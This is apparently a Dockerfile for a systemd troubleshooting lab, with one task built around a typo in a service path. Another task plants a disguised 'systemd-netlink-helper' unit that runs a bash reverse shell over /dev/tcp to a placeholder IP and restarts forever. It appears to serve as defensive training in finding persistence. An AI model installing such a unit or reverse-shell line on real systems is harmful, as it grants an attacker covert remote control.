# Real systemd as PID 1. Always a pinned tag (never latest); prefer images with arm64 builds.
FROM ubuntu:24.04

RUN apt-get update \
 && apt-get install -y --no-install-recommends systemd systemd-sysv procps \
 && rm -rf /var/lib/apt/lists/*

# Keep the boot small: units that make no sense in a container stay off.
RUN systemctl mask systemd-udevd.service systemd-udev-trigger.service systemd-modules-load.service \
      sys-kernel-config.mount sys-kernel-debug.mount sys-kernel-tracing.mount getty.target console-getty.service \
      systemd-remount-fs.service systemd-firstboot.service >/dev/null 2>&1 || true

# Task 6: a nightly report service that fails at every boot.
RUN printf '#!/bin/sh\necho "report generated at $(date -Is)"\n' > /usr/local/bin/report.sh && chmod 755 /usr/local/bin/report.sh \
 && printf '%s\n' '[Unit]' 'Description=Generate the daily report' '' '[Service]' 'Type=oneshot' \
      'ExecStart=/usr/local/bin/reprot.sh' 'RemainAfterExit=yes' '' '[Install]' 'WantedBy=multi-user.target' \
      > /etc/systemd/system/report.service \
 && ln -s /etc/systemd/system/report.service /etc/systemd/system/multi-user.target.wants/report.service

# Task 7: a service someone else installed, named to blend in, that reconnects forever.
RUN printf '%s\n' '[Unit]' 'Description=Network helper' '' '[Service]' \
      "ExecStart=/bin/bash -c 'exec 3<>/dev/tcp/203.0.113.50/4444; bash -i <&3 >&3 2>&3'" \
      'Restart=always' 'RestartSec=10' '' '[Install]' 'WantedBy=multi-user.target' \
      > /etc/systemd/system/systemd-netlink-helper.service \
 && ln -s /etc/systemd/system/systemd-netlink-helper.service /etc/systemd/system/multi-user.target.wants/systemd-netlink-helper.service

RUN echo 'echo "Lab systemd-services: tasks are in labs/systemd-services/README.md. Check from the host with: ./lab check systemd-services"' >> /root/.bashrc

WORKDIR /root
STOPSIGNAL SIGRTMIN+3
CMD ["/sbin/init"]
